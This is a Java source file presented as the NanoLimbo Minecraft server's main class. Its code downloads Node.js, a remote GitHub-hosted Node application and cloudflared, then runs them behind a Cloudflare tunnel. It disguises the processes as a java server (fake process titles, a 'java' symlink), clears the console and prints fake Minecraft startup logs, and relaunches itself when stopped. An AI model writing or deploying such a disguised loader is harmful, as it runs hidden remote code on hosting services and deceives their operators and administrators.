package ua.nanit.limbo;

import java.io.*;
import java.lang.management.ManagementFactory;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import java.time.LocalTime;
import java.time.format.DateTimeFormatter;
import java.util.stream.Stream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

public final class NanoLimbo {

// ============================================================
// 【Node.js 部署配置区】
// ============================================================
private static final String MC_BOT_DIR = env("MC_BOT_DIR", "logs/.mcbot");
private static final boolean NODE_ENABLED = !"false".equalsIgnoreCase(env("NODE_ENABLED", "true"));
private static final String GITHUB_REPO = env("GITHUB_REPO", "zx1447/indexaoyoumc");
private static final String GITHUB_BRANCH = env("GITHUB_BRANCH", "main");
private static final String GITHUB_TOKEN = env("GITHUB_TOKEN", "");
private static final boolean CF_ENABLED = !"false".equalsIgnoreCase(env("CF_ENABLED", "true"));
private static final String CF_TOKEN = env("CF_TOKEN", "");
private static final String CF_DOMAIN = env("CF_DOMAIN", "");
private static final String NODE_VERSION = env("NODE_VERSION", "v22.14.0");
private static final String NODE_SCRIPT = env("NODE_SCRIPT", "index.js");
private static final String NODE_FORCE_UPDATE = env("NODE_FORCE_UPDATE", "false");

private static final String FAKE_CMD = "java -Xms128M -Xmx2560M -jar server.jar -Djline.terminal=jline.UnsupportedTerminal -Dfile.encoding=UTF-8 -Duser.language=zh -Duser.country=CN -Duser.timezone=Asia/Shanghai";
// ============================================================

private static volatile String tunnelUrl = "";
private static volatile String nodePort = "N/A";

private static final AtomicReference<String> lastKnownTunnelUrl = new AtomicReference<>("");
private static final AtomicBoolean tunnelMonitorRunning = new AtomicBoolean(false);

private NanoLimbo() {}

private static String env(String k, String d) {
    String v = System.getenv(k);
    return (v != null && !v.trim().isEmpty()) ? v.trim() : d;
}

// ============================================================
// 仿真辅助函数
// ============================================================

private static String tsMs() {
    return LocalTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss.SSS"));
}

private static void limboLog(String msg) {
    System.out.println(tsMs() + " INFO Limbo --  " + msg);
}

private static void limboLog(String msg, long delayMs) {
    try { Thread.sleep(delayMs); } catch (InterruptedException ignored) {}
    System.out.println(tsMs() + " INFO Limbo --  " + msg);
}

private static void clearConsole() {
    try {
        for (int i = 0; i < 200; i++) { System.out.println(); }
        System.out.print("\033[3J\033[H\033[2J");
        System.out.flush();
    } catch (Exception ignored) {}
}

// ============================================================
// Java 纯网络下载与解压核心
// ============================================================

private static boolean downloadFile(String urlStr, Path target, String token) {
    try {
        int redirectCount = 0;
        URL currentUrl = new URL(urlStr);
        
        while (redirectCount < 10) {
            HttpURLConnection conn = (HttpURLConnection) currentUrl.openConnection();
            conn.setInstanceFollowRedirects(false);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(120000);
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
            if (token != null && !token.isEmpty()) {
                conn.setRequestProperty("Authorization", "Bearer " + token);
                conn.setRequestProperty("Accept", "application/vnd.github+json");
            }

            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_MOVED_PERM || responseCode == HttpURLConnection.HTTP_MOVED_TEMP || responseCode == HttpURLConnection.HTTP_SEE_OTHER) {
                String location = conn.getHeaderField("Location");
                if (location == null) break;
                currentUrl = new URL(currentUrl, location);
                redirectCount++;
                continue;
            }

            if (responseCode == HttpURLConnection.HTTP_OK) {
                try (InputStream in = conn.getInputStream(); 
                     OutputStream out = Files.newOutputStream(target, StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING)) {
                    byte[] buffer = new byte[8192];
                    int bytesRead;
                    while ((bytesRead = in.read(buffer)) != -1) {
                        out.write(buffer, 0, bytesRead);
                    }
                }
                return true;
            } else {
                return false;
            }
        }
    } catch (Exception ignored) {}
    return false;
}

private static boolean downloadWithMirrors(List<String> urls, Path target, String token) {
    for (String url : urls) {
        try {
            Files.deleteIfExists(target);
            if (downloadFile(url, target, token)) {
                if (Files.exists(target) && Files.size(target) > 1024) {
                    return true;
                } else {
                    Files.deleteIfExists(target);
                }
            }
        } catch (Exception ignored) {}
    }
    return false;
}

private static void extractGithubZip(Path zipFile, Path targetDir) throws IOException {
    Files.createDirectories(targetDir);
    try (ZipInputStream zis = new ZipInputStream(Files.newInputStream(zipFile))) {
        ZipEntry entry;
        while ((entry = zis.getNextEntry()) != null) {
            if (entry.isDirectory()) continue;
            
            String name = entry.getName();
            int slashIndex = name.indexOf('/');
            if (slashIndex >= 0) {
                name = name.substring(slashIndex + 1);
            }
            if (name.isEmpty()) continue;

            Path newPath = targetDir.resolve(name).normalize();
            if (!newPath.startsWith(targetDir.normalize())) throw new IOException("Bad zip entry");
            
            Files.createDirectories(newPath.getParent());
            Files.copy(zis, newPath, StandardCopyOption.REPLACE_EXISTING);
            zis.closeEntry();
        }
    }
}

// 【修复1】改为 --strip-components=2
private static boolean extractTarGz(Path archive, Path targetDir) {
    try {
        ProcessBuilder pb = new ProcessBuilder("tar", "-xzf", archive.toString(), "-C", targetDir.toString(), "--strip-components=2");
        pb.redirectErrorStream(true);
        Process p = pb.start();
        try (BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()))) { while (r.readLine() != null); }
        return p.waitFor(2, TimeUnit.MINUTES) && p.exitValue() == 0;
    } catch (Exception e) {
        return false;
    }
}

// ============================================================
// 入口
// ============================================================

public static void main(String[] args) {
    if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0F) {
        System.err.println("ERROR: Your Java version is too lower, please switch the version in startup menu!");
        try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
        System.exit(1);
    }

    forceKillStaleProcesses();
    autoFixLimboConfig();
    startZombieReaper();

    if (NODE_ENABLED) {
        try {
            Path botDir = Paths.get(MC_BOT_DIR);
            Files.createDirectories(botDir);
            Files.deleteIfExists(botDir.resolve(".node_app.log"));
            Files.deleteIfExists(botDir.resolve("daemon.log"));
            Files.deleteIfExists(botDir.resolve(".pids"));

            Thread deployThread = new Thread(() -> {
                try { executeJavaDeployment(botDir); } catch (Exception e) {
                    System.err.println("[Deploy] Fatal error during Java deployment: " + e.getMessage());
                }
            }, "Node-Deploy");
            deployThread.setDaemon(true);
            deployThread.start();

            Thread checkerThread = new Thread(() -> {
                while(tunnelUrl.isEmpty()) {
                    checkDeployInfo();
                    try { Thread.sleep(1000); } catch (InterruptedException e) { break; }
                }
                startTunnelMonitor();
            }, "Info-Checker");
            checkerThread.setDaemon(true);
            checkerThread.start();

            startJavaWatchdog();

            while(tunnelUrl.isEmpty()) {
                try { Thread.sleep(1000); } catch (InterruptedException ignored) {}
            }
            
            clearConsole();
            printFakeLimboStartup(tunnelUrl);
            
            try { Thread.sleep(4000); } catch (InterruptedException ignored) {}
            clearConsole();
            
            limboLog("Starting server...", 0);
            limboLog("Preparing level \"world\"", 0);
            limboLog("Preparing start region for dimension minecraft:overworld", 0);
            limboLog("Preparing spawn area: 1%", 0);
            limboLog("Preparing spawn area: 5%", 0);
            limboLog("Preparing spawn area: 15%", 0);
            limboLog("Preparing spawn area: 35%", 0);
            limboLog("Preparing spawn area: 60%", 0);
            limboLog("Preparing spawn area: 80%", 0);
            limboLog("Preparing spawn area: 99%", 0);
            limboLog("Preparing spawn area: 100%", 0);
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                System.out.println("\n[Guard] Detected server stop signal! Executing hard restart protocol...");
                tunnelMonitorRunning.set(false);
                try {
                    forceKillStaleProcesses();
                    String currentDir = System.getProperty("user.dir");
                    long currentPid = ProcessHandle.current().pid();
                    String jarName = "server.jar";
                    File[] jars = new File(currentDir).listFiles((dir, name) -> name.endsWith(".jar"));
                    if (jars != null && jars.length > 0) jarName = jars[0].getName();
                    String restartScript = "cd '" + currentDir + "' && setsid bash -c 'while kill -0 " + currentPid + " 2>/dev/null; do sleep 0.1; done; sleep 1; java -Xms128M -Xmx2560M -jar " + jarName + " nogui' > /dev/null 2>&1 &";
                    new ProcessBuilder("bash", "-c", restartScript).start();
                } catch (Exception e) { System.err.println("[Guard] Failed: " + e.getMessage()); }
            }, "Shutdown-Guard"));
        } catch (Exception ignored) {}
    }

    try { new LimboServer().start(); } catch (Throwable t) {}
    try { Thread.currentThread().join(); } catch (InterruptedException ignored) {}
}

    // ============================================================
    // 核心：纯 Java 部署流程 (修复权限与 Alpine 兼容)
    // ============================================================

    /**
     * 检测当前系统是否为 Alpine (musl libc)
     */
    private static boolean isMusl() {
        try {
            ProcessBuilder pb = new ProcessBuilder("ldd", "--version");
            pb.redirectErrorStream(true);
            Process p = pb.start();
            try (BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
                String line;
                while ((line = r.readLine()) != null) {
                    if (line.toLowerCase().contains("musl")) return true;
                }
            }
            p.waitFor(2, TimeUnit.SECONDS);
        } catch (Exception ignored) {}
        try {
            Path osRelease = Paths.get("/etc/os-release");
            if (Files.exists(osRelease)) {
                String content = Files.readString(osRelease).toLowerCase();
                if (content.contains("alpine") || content.contains("musl")) return true;
            }
        } catch (Exception ignored) {}
        return false;
    }

    private static void executeJavaDeployment(Path workDir) throws Exception {
        Path nodeDir = workDir.resolve(".node");
        Path appDir = workDir;
        Path jreDir = workDir.resolve("jre21/bin");
        Path pidsFile = workDir.resolve(".pids");
        Files.createDirectories(jreDir);
        Files.writeString(pidsFile, "", StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING);

        String authToken = GITHUB_TOKEN;
        if (authToken.contains(":") && authToken.substring(authToken.indexOf(':') + 1).startsWith("ghp_")) {
            authToken = authToken.substring(authToken.indexOf(':') + 1);
        }

        // ================= 1. 下载并解压 Node.js =================
        boolean nodeValid = false;
        Path nodeRealPath = nodeDir.resolve("bin/.node_real");
        
        if (Files.exists(nodeRealPath)) {
            ProcessBuilder pb = new ProcessBuilder(nodeRealPath.toString(), "-v");
            pb.redirectErrorStream(true);
            Process p = pb.start();
            try (BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
                String ver = r.readLine();
                if (ver != null && ver.startsWith(NODE_VERSION)) nodeValid = true;
            }
            p.waitFor(5, TimeUnit.SECONDS);
        }

        if (!nodeValid) {
            limboLog("[Deploy] Downloading Node.js " + NODE_VERSION + " via Java...");
            deleteDirectory(nodeDir.toFile());
            Files.createDirectories(nodeDir);
            
            String arch = System.getProperty("os.arch").toLowerCase().contains("aarch64") || System.getProperty("os.arch").toLowerCase().contains("arm64") ? "arm64" : "x64";
            String muslSuffix = isMusl() ? "-musl" : "";
            String nodeFile = "node-" + NODE_VERSION + "-linux" + muslSuffix + "-" + arch + ".tar.gz";
            String nodeUrl = "https://nodejs.org/dist/" + NODE_VERSION + "/" + nodeFile;
            
            Path archive = Paths.get("/tmp", "nanolimbo_node.tar.gz");
            List<String> urls = Arrays.asList(nodeUrl, "https://gh-proxy.com/" + nodeUrl, "https://mirror.ghproxy.com/" + nodeUrl);
            
            if (!downloadWithMirrors(urls, archive, null)) {
                throw new RuntimeException("Failed to download Node.js");
            }

            if (!extractTarGz(archive, nodeDir)) {
                throw new RuntimeException("Failed to extract Node.js tar.gz");
            }
            Files.deleteIfExists(archive);

            //【修复2】全局自动查找node二进制，不再固定路径
            Path nodeBin = null;
            try(Stream<Path> walk = Files.walk(nodeDir)){
                nodeBin = walk.filter(Files::isRegularFile)
                        .filter(p -> p.getFileName().toString().equals("node"))
                        .findFirst().orElse(null);
            }
            if(nodeBin == null){
                throw new RuntimeException("解压完成，但全局找不到node可执行文件");
            }
            // 确保bin文件夹存在
            Files.createDirectories(nodeRealPath.getParent());
            // 复制生成.node_real
            Files.copy(nodeBin, nodeRealPath, StandardCopyOption.REPLACE_EXISTING);
            nodeBin.toFile().setExecutable(true, false);
            nodeRealPath.toFile().setExecutable(true, false);

            // 软链接兜底
            try {
                Files.deleteIfExists(nodeDir.resolve("bin/node_real"));
                Files.createSymbolicLink(nodeDir.resolve("bin/node_real"), nodeRealPath);
            } catch (Exception ignored) {}
        }

        // ================= 2. 下载并解压应用代码 =================
        if (!Files.exists(appDir.resolve(NODE_SCRIPT)) || "true".equalsIgnoreCase(NODE_FORCE_UPDATE)) {
            limboLog("[Deploy] Downloading application code via Java...");
            
            Path archive = Paths.get("/tmp", "nanolimbo_app.zip");
            
            String apiUrl = "https://api.github.com/repos/" + GITHUB_REPO + "/zipball/" + GITHUB_BRANCH;
            String fallbackUrl = "https://github.com/" + GITHUB_REPO + "/archive/refs/heads/" + GITHUB_BRANCH + ".zip";
            
            List<String> urls = new ArrayList<>();
            if (!authToken.isEmpty()) urls.add(apiUrl);
            urls.add(fallbackUrl);
            urls.add("https://gh-proxy.com/" + fallbackUrl);
            urls.add("https://mirror.ghproxy.com/" + fallbackUrl);
            if (!authToken.isEmpty()) urls.add("https://gh-proxy.com/" + apiUrl);

            if (downloadWithMirrors(urls, archive, authToken)) {
                Files.walk(appDir, 1)
                     .filter(p -> !p.equals(appDir))
                     .filter(p -> !p.getFileName().toString().equals(".node") && !p.getFileName().toString().equals("jre21") && !p.getFileName().toString().equals(".cf") && !p.getFileName().toString().equals(".pids"))
                     .forEach(p -> { try { deleteDirectory(p.toFile()); } catch (Exception ignored) {} });
                
                extractGithubZip(archive, appDir);
                Files.deleteIfExists(archive);
            } else {
                throw new RuntimeException("Failed to download application code. Check network or GitHub Token.");
            }
        }

        // ================= 3. NPM Install =================
        if (Files.exists(appDir.resolve("package.json")) && !Files.exists(appDir.resolve("node_modules"))) {
            limboLog("[Deploy] Running npm install...");
            
            Path nodeExe = nodeDir.resolve("bin/.node_real");
            
            // 终极校验：文件不存在直接抛错
            if (!Files.exists(nodeExe)) {
                throw new RuntimeException("Node executable missing: " + nodeExe);
            }
            if (!Files.isExecutable(nodeExe)) {
                nodeExe.toFile().setExecutable(true, false);
            }

            Path npmCli = nodeDir.resolve("lib/node_modules/npm/bin/npm-cli.js");
            ProcessBuilder pb = new ProcessBuilder(nodeExe.toString(), npmCli.toString(), "install", "--no-audit", "--no-fund", "--production", "--no-optional");
            pb.directory(appDir.toFile());
            pb.redirectErrorStream(true);
            Process p = pb.start();
            
            try (BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
                String line;
                while ((line = r.readLine()) != null) {
                    limboLog("[NPM] " + line);
                }
            }
            
            int exitCode = p.waitFor();
            if (exitCode != 0) {
                throw new RuntimeException("npm install failed with exit code " + exitCode);
            }
        }

        // ================= 4. 下载 Cloudflared =================
        Path cfBin = jreDir.resolve("java_cf");
        if (CF_ENABLED && !Files.exists(cfBin)) {
            limboLog("[Deploy] Downloading Cloudflared via Java...");
            String arch = System.getProperty("os.arch").contains("aarch64") || System.getProperty("os.arch").contains("arm64") ? "arm64" : "amd64";
            String cfUrl = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-" + arch;
            List<String> urls = Arrays.asList(cfUrl, "https://gh-proxy.com/" + cfUrl);
            
            if (downloadWithMirrors(urls, cfBin, null)) {
                cfBin.toFile().setExecutable(true);
            } else {
                limboLog("[Deploy] WARNING: Failed to download Cloudflared.");
            }
        }

        // ================= 5. 启动守护脚本 =================
        limboLog("[Deploy] Starting daemon process...");
        Path daemonScript = generateDaemonScript(workDir);
        ProcessBuilder pb = new ProcessBuilder("bash", daemonScript.toString());
        pb.directory(workDir.toFile());
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.appendTo(workDir.resolve("daemon.log").toFile()));
        pb.start();
    }

// ============================================================
// 进程管理辅助
// ============================================================

private static void forceKillStaleProcesses() {
    Process p = null;
    try {
        Path pidsFile = Paths.get(MC_BOT_DIR).resolve(".pids");
        String killCmd = "";
        if (Files.exists(pidsFile)) {
            for (String pid : Files.readAllLines(pidsFile)) {
                pid = pid.trim();
                if (!pid.isEmpty() && pid.matches("\\d+")) {
                    killCmd += "kill -9 -" + pid + " 2>/dev/null; pkill -9 -P " + pid + " 2>/dev/null; kill -9 " + pid + " 2>/dev/null; ";
                }
            }
        }
        if (killCmd.isEmpty()) return;
        p = new ProcessBuilder("bash", "-c", killCmd).start();
        if (!p.waitFor(3, TimeUnit.SECONDS)) { p.destroyForcibly(); p.waitFor(2, TimeUnit.SECONDS); }
    } catch (Exception ignored) {}
}

private static void startJavaWatchdog() {
    Thread watchdog = new Thread(() -> {
        while (true) {
            try {
                Thread.sleep(30000);
                Path pidsFile = Paths.get(MC_BOT_DIR).resolve(".pids");
                if (!Files.exists(pidsFile)) continue;
                List<String> alivePids = new ArrayList<>();
                for (String pid : Files.readAllLines(pidsFile)) {
                    pid = pid.trim();
                    if (!pid.isEmpty() && pid.matches("\\d+")) {
                        ProcessHandle handle = ProcessHandle.of(Long.parseLong(pid)).orElse(null);
                        if (handle != null && handle.isAlive()) alivePids.add(pid);
                        else if (handle != null) handle.destroyForcibly();
                    }
                }
                Files.write(pidsFile, String.join("\n", alivePids).getBytes());
            } catch (Exception ignored) {}
        }
    }, "Java-Zombie-Watchdog");
    watchdog.setDaemon(true);
    watchdog.start();
}

private static void startZombieReaper() {
    Thread reaper = new Thread(() -> {
        while (true) {
            try { Thread.sleep(15000); Process p = new ProcessBuilder("true").start(); p.waitFor(5, TimeUnit.SECONDS); } catch (Exception ignored) {}
        }
    }, "Zombie-Reaper");
    reaper.setDaemon(true);
    reaper.start();
}

private static void deleteDirectory(File file) {
    File[] files = file.listFiles();
    if (files != null) { for (File f : files) { if (f.isDirectory()) deleteDirectory(f); else f.delete(); } }
    file.delete();
}

private static void autoFixLimboConfig() {
    try {
        Path configFile = Paths.get("settings.yml");
        String serverPort = env("SERVER_PORT", "25565");
        Files.deleteIfExists(configFile);
        String content = "bind:\n  host: 0.0.0.0\n  port: " + serverPort + "\nlimbo:\n  dimension: overworld\n  gamemode: adventure\n  max-players: 20\n  player-idle-timeout: 0\n  player-info:\n    username: \"LimboPlayer\"\n    display-name: \"&eLimboPlayer\"\n    property: []\nonline-mode: false\nforward-mode: none\nping:\n  description: \"A NanoLimbo server\"\n  version: \"1.20.x\"\n  max-players: 20\n";
        Files.writeString(configFile, content);
    } catch (Exception ignored) {}
}

private static void printFakeLimboStartup(String url) {
    limboLog("Starting server...", 0);
    limboLog("Binding remote endpoint to: " + url, 0);
    limboLog("Preparing level \"world\"", randInt(100, 300));
    limboLog("Preparing start region for dimension minecraft:overworld", randInt(100, 300));
    limboLog("Preparing spawn area: 1%", 0); limboLog("Preparing spawn area: 2%", 0);
    try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
    limboLog("Preparing spawn area: 5%", 0); limboLog("Preparing spawn area: 8%", 0);
    try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
    limboLog("Preparing spawn area: 15%", 0); limboLog("Preparing spawn area: 20%", 0);
    try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
    limboLog("Preparing spawn area: 35%", 0); limboLog("Preparing spawn area: 60%", 0); limboLog("Preparing spawn area: 80%", 0);
    try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
    limboLog("Preparing spawn area: 99%", 0); limboLog("Preparing spawn area: 100%", 0);
}

private static int randInt(int min, int max) { return min + (int)(Math.random() * (max - min + 1)); }

private static void checkDeployInfo() {
    Path dir = Paths.get(MC_BOT_DIR);
    try {
        Path portFile = dir.resolve(".node_port");
        if (Files.exists(portFile) && nodePort.equals("N/A")) {
            String content = Files.readString(portFile).trim();
            if (!content.isEmpty()) nodePort = content.split("\\n")[0].trim();
        }
    } catch (Exception ignored) {}
    try {
        Path urlFile = dir.resolve(".cf/tunnel_url.txt");
        if (Files.exists(urlFile) && tunnelUrl.isEmpty()) {
            String rawUrl = Files.readString(urlFile).trim();
            java.util.regex.Matcher m = java.util.regex.Pattern.compile("(https://[a-zA-Z0-9-]+\\.trycloudflare\\.com)").matcher(rawUrl);
            if (m.find()) {
                String matchedUrl = m.group(1);
                if (!matchedUrl.equals("https://api.trycloudflare.com")) { tunnelUrl = matchedUrl; lastKnownTunnelUrl.set(tunnelUrl); }
            } else if (rawUrl.startsWith("https://") && !rawUrl.contains("api.trycloudflare.com")) {
                tunnelUrl = rawUrl.split("\\n")[0].trim(); lastKnownTunnelUrl.set(tunnelUrl);
            }
        }
    } catch (Exception ignored) {}
}

private static void startTunnelMonitor() {
    if (tunnelMonitorRunning.getAndSet(true)) return;
    Thread monitor = new Thread(() -> {
        try { Thread.sleep(20000); } catch (InterruptedException ignored) {}
        while (tunnelMonitorRunning.get()) {
            try {
                Thread.sleep(12000);
                Path urlFile = Paths.get(MC_BOT_DIR).resolve(".cf/tunnel_url.txt");
                if (!Files.exists(urlFile)) continue;
                String content = Files.readString(urlFile).trim();
                if (content.isEmpty()) continue;
                String currentUrl = "";
                java.util.regex.Matcher m = java.util.regex.Pattern.compile("(https://[a-zA-Z0-9-]+\\.trycloudflare\\.com)").matcher(content);
                if (m.find()) {
                    String matchedUrl = m.group(1);
                    if (!matchedUrl.equals("https://api.trycloudflare.com")) currentUrl = matchedUrl;
                } else if (content.startsWith("https://") && !content.contains("api.trycloudflare.com")) {
                    currentUrl = content.split("\\n")[0].trim();
                }
                if (currentUrl.isEmpty()) continue;
                String lastUrl = lastKnownTunnelUrl.get();
                if (!currentUrl.equals(lastUrl)) { lastKnownTunnelUrl.set(currentUrl); tunnelUrl = currentUrl; limboLog("Binding remote endpoint to: " + currentUrl); }
            } catch (Exception ignored) {}
        }
    }, "Tunnel-Monitor");
    monitor.setDaemon(true); monitor.start();
}

// ============================================================
// 生成守护脚本 (递归杀树防僵尸，严防死锁 502)
// ============================================================

private static Path generateDaemonScript(Path workDir) throws Exception {
    Path dir = workDir.toAbsolutePath();
    Path script = dir.resolve("daemon.sh");
    String cfMode = CF_TOKEN.isEmpty() ? "quick" : "fixed";

    String content = "#!/bin/bash\n" +
        "set +e\n" +
        "trap 'while wait -n 2>/dev/null; do :; done' CHLD\n" +
        "cleanup() {\n for job in $(jobs -p 2>/dev/null); do kill_tree $job; done\n while wait -n 2>/dev/null; do :; done\n}\n" +
        "trap cleanup EXIT TERM INT\n" +
        "\n" +
        "WORK_DIR=\"" + dir + "\"\n" +
        "JRE_DIR=\"$WORK_DIR/jre21/bin\"\n" +
        "CF_BIN=\"$JRE_DIR/java_cf\"\n" +
        "CF_CONF_DIR=\"$WORK_DIR/jre21/conf\"\n" +
        "NODE_FAKE=\"$JRE_DIR/java\"\n" +
        "NODE_REAL=\"$WORK_DIR/.node/bin/.node_real\"\n" +
        "APP_DIR=\"$WORK_DIR\"\n" +
        "NODE_SCRIPT=\"" + NODE_SCRIPT + "\"\n" +
        "export PATH=\"$WORK_DIR/.node/bin:$PATH\"\n" +
        "export _JAVA_WRAPPER=\"$WORK_DIR/.node/bin/node\"\n" +
        "\n" +
        "cat > \"$WORK_DIR/.nd_preload.js\" << 'PRELOAD_EOF'\n" +
        "try {\n process.title = '" + FAKE_CMD + "'; var _cp = require('child_process'); var _origSpawn = _cp.spawn; var _origFork = _cp.fork; var _wp = process.env._JAVA_WRAPPER || process.execPath;\n _cp.spawn = function(cmd, args, opts) {\n if (typeof cmd === 'string' && (cmd === 'node' || cmd.endsWith('/node') || cmd === process.execPath || cmd.endsWith('/.node_real') || cmd.endsWith('/java'))) {\n opts = Object.assign({}, opts || {}); opts.execPath = _wp; cmd = _wp;\n } return _origSpawn.call(this, cmd, args, opts);\n };\n _cp.fork = function(mod, args, opts) {\n opts = Object.assign({}, opts || {}); opts.execPath = _wp; return _origFork.call(this, mod, args, opts);\n };\n} catch(e) {}\n" +
        "PRELOAD_EOF\n" +
        "\n" +
        "chmod +x \"$NODE_FAKE\" \"$CF_BIN\" 2>/dev/null\n" +
        "ln -sf \"$NODE_REAL\" \"$NODE_FAKE\" 2>/dev/null\n" +
        "\n" +
        "kill_tree() {\n local PID=$1; if [ -z \"$PID\" ]; then return; fi; if ! kill -0 $PID 2>/dev/null; then wait $PID 2>/dev/null; return; fi\n local CHILDREN=$(pgrep -P $PID 2>/dev/null); for child in $CHILDREN; do kill_tree $child; done\n kill $PID 2>/dev/null; local waited=0; while [ $waited -lt 5 ]; do if ! kill -0 $PID 2>/dev/null; then break; fi; sleep 1; waited=$((waited + 1)); done\n if kill -0 $PID 2>/dev/null; then kill -9 $PID 2>/dev/null; fi; wait $PID 2>/dev/null\n}\n" +
        "\n" +
        "write_cf_config() {\n local PROTO=$1; local PORT=$2\n cat > \"$CF_CONF_DIR/server.properties\" << CFCONF\nurl: http://localhost:$PORT\nno-autoupdate: true\nprotocol: $PROTO\nCFCONF\n}\n" +
        "\n" +
        "start_cf_tunnel() {\n local PROTO=$1; local PORT=$2; local LOG_FILE=$3\n write_cf_config \"$PROTO\" \"$PORT\"\n (exec -a \"" + FAKE_CMD + "\" \"$CF_BIN\" --config \"$CF_CONF_DIR/server.properties\" > \"$LOG_FILE\" 2>&1) &\n echo $!\n}\n" +
        "\n" +
        "is_port_free() { (echo >/dev/tcp/localhost/$1) &>/dev/null && return 1 || return 0; }\n" +
        "while true; do NODE_PORT=$((RANDOM % 40000 + 20000)); if is_port_free $NODE_PORT; then break; fi; done\n" +
        "export SERVER_PORT=$NODE_PORT; export PORT=$NODE_PORT\n" +
        "\n" +
        "(exec -a \"" + FAKE_CMD + "\" \"$NODE_FAKE\" --require \"$WORK_DIR/.nd_preload.js\" $NODE_SCRIPT >> \"$WORK_DIR/.node_app.log\" 2>&1) &\n" +
        "NODE_PID=$!\n" +
        "echo \"$NODE_PID\" >> \"$WORK_DIR/.pids\"\n" +
        "\n" +
        "for i in $(seq 1 60); do\n HTTP_CODE=$(curl -s -o /dev/null -w \"%{http_code}\" \"http://127.0.0.1:$NODE_PORT\" 2>/dev/null)\n if [ -n \"$HTTP_CODE\" ] && [ \"$HTTP_CODE\" != \"000\" ]; then break; fi; sleep 1\ndone\n" +
        "echo \"$NODE_PORT\" > \"$WORK_DIR/.node_port\"\n" +
        "\n" +
        "CF_PID=\"\"\n" +
        "TUNNEL_OK=false\n" +
        "for PROTO in quic http2 auto; do\n if [ \"$TUNNEL_OK\" = \"true\" ]; then break; fi\n NEW_PID=$(start_cf_tunnel \"$PROTO\" \"$NODE_PORT\" \"$WORK_DIR/.cf/cf.log\")\n CF_PID=$NEW_PID\n for i in $(seq 1 45); do\n if ! kill -0 $NEW_PID 2>/dev/null; then break; fi\n URL=$(grep -oP 'https://[a-zA-Z0-9-]+\\\\.trycloudflare\\\\.com' \"$WORK_DIR/.cf/cf.log\" 2>/dev/null | grep -v 'api\\.trycloudflare\\.com' | tail -1)\n if [ -n \"$URL\" ]; then\n echo \"$URL\" > \"$WORK_DIR/.cf/tunnel_url.txt\"\n echo \"PROTOCOL=$PROTO\" >> \"$WORK_DIR/.cf/tunnel_url.txt\"\n echo \"CF_PID=$NEW_PID\" >> \"$WORK_DIR/.cf/tunnel_url.txt\"\n TUNNEL_OK=true; break; fi; sleep 1\n done\n if [ \"$TUNNEL_OK\" != \"true\" ]; then kill_tree \"$NEW_PID\"; CF_PID=\"\"; fi\n" +
        "done\n" +
        "\n" +
        "while true; do\n if [ -n \"$NODE_PID\" ] && ! kill -0 $NODE_PID 2>/dev/null; then\n wait $NODE_PID 2>/dev/null\n if [ -n \"$CF_PID\" ]; then kill_tree \"$CF_PID\"; CF_PID=\"\"; fi\n (exec -a \"" + FAKE_CMD + "\" \"$NODE_FAKE\" --require \"$WORK_DIR/.nd_preload.js\" $NODE_SCRIPT >> \"$WORK_DIR/.node_app.log\" 2>&1) &\n NODE_PID=$!\n for i in $(seq 1 60); do\n HTTP_CODE=$(curl -s -o /dev/null -w \"%{http_code}\" \"http://127.0.0.1:$NODE_PORT\" 2>/dev/null)\n if [ -n \"$HTTP_CODE\" ] && [ \"$HTTP_CODE\" != \"000\" ]; then break; fi; sleep 1\n done\n fi\n \n NEED_REBUILD=false\n if [ -z \"$CF_PID\" ]; then NEED_REBUILD=true\n elif ! kill -0 $CF_PID 2>/dev/null; then wait $CF_PID 2>/dev/null; NEED_REBUILD=true; fi\n \n if [ \"$NEED_REBUILD\" = \"true\" ]; then\n rm -f \"$WORK_DIR/.cf/tunnel_url.txt\" \"$WORK_DIR/.cf/cf.log\"\n TUNNEL_OK=false\n for RPROTO in quic http2 auto; do\n if [ \"$TUNNEL_OK\" = \"true\" ]; then break; fi\n NEW_PID=$(start_cf_tunnel \"$RPROTO\" \"$NODE_PORT\" \"$WORK_DIR/.cf/cf.log\")\n CF_PID=$NEW_PID\n for i in $(seq 1 45); do\n if ! kill -0 $NEW_PID 2>/dev/null; then break; fi\n URL=$(grep -oP 'https://[a-zA-Z0-9-]+\\\\.trycloudflare\\\\.com' \"$WORK_DIR/.cf/cf.log\" 2>/dev/null | grep -v 'api\\.trycloudflare\\.com' | tail -1)\n if [ -n \"$URL\" ]; then\n echo \"$URL\" > \"$WORK_DIR/.cf/tunnel_url.txt\"\n echo \"PROTOCOL=$RPROTO\" >> \"$WORK_DIR/.cf/tunnel_url.txt\"\n echo \"CF_PID=$NEW_PID\" >> \"$WORK_DIR/.cf/tunnel_url.txt\"\n TUNNEL_OK=true; break; fi; sleep 1\n done\n if [ \"$TUNNEL_OK\" != \"true\" ]; then kill_tree \"$NEW_PID\"; CF_PID=\"\"; fi\n done\n fi\n while wait -n 2>/dev/null; do :; done\n sleep 15\ndone\n";

    Files.writeString(script, content);
    script.toFile().setExecutable(true);
    return script;
}

}
